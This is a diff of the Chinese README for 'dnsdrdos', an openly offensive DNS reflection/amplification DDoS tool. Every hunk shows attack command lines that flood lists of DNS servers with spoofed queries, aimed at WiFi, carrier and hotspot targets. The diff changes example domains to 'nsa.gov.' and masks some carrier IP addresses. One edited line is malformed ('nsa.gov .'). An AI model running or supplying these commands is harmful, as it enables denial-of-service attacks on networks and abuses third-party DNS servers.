@@ -112,7 +112,7 @@ dnsdrdos 向大量的 DNS 服务器发送 A 记录查询请求，DNS 服务器�
 
 ```bash
 # Google WiFi 公共热点
-./dnsdrdos -f dns_servers.txt -s 192.168.1.10 -d google.com. -t 16 -D
+./dnsdrdos -f dns_servers.txt -s 192.168.1.10 -d nsa.gov . -t 16 -D
 
 # 通过指定 AP（Access Point）
 ./dnsdrdos -f dns_servers.txt -a 10.0.0.1 -t 16 -m
@@ -155,10 +155,10 @@ dnsdrdos 向大量的 DNS 服务器发送 A 记录查询请求，DNS 服务器�
 
 ```bash
 # 电信 WiFi 攻击
-./dnsdrdos -f dns_servers.txt -s 1.2.3.4 -d 221.130.33.52 -t 32 -w 100
+./dnsdrdos -f dns_servers.txt -s 1.2.3.4 -d 221.130.33.xx -t 32 -w 100
 
 # 移动 WiFi 攻击
-./dnsdrdos -f dns_servers.txt -s 10.0.0.1 -d 211.139.2.69 -t 32 -w 100
+./dnsdrdos -f dns_servers.txt -s 10.0.0.1 -d 211.139.2.xx -t 32 -w 100
 ```
 
 ### 6.2 4G/5G 热点攻击
@@ -324,8 +324,8 @@ DNS 通常监听在端口 53 上。攻击时可以指定目标端口：
 
 **版权说明:**
 - 原作者：`noptrix` (http://www.nullsecurity.net/)
-- 2026版升级作者：**Leechuihui** (Jan 2026)
-- 许可协议：**BSD-3** (与 nullsecurity 联合许可)
+- 2026版升级作者：Leechuihui (Jan 2026)
+- 许可协议：BSD-3 (与 nullsecurity 联合许可)
 
 **使用风险:**
 本程序按"现状"提供，无任何明示或默示保证。使用者须自行承担使用本程序的全部风险。
@@ -338,13 +338,13 @@ DNS 通常监听在端口 53 上。攻击时可以指定目标端口：
 
 ```bash
 # 基本攻击
-./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d google.com. -l 10000
+./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d nsa.gov. -l 10000
 
 # 带详细模式
-./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d google.com. -l 10000 -v
+./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d nsa.gov. -l 10000 -v
 
 # 带多线程和 TXT 模式
-./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d google.com. -t 8 -m
+./dnsdrdos -f dns_servers.txt -s 192.168.1.100 -d nsa.gov. -t 8 -m
 ```
 
 ### WiFi 攻击示例
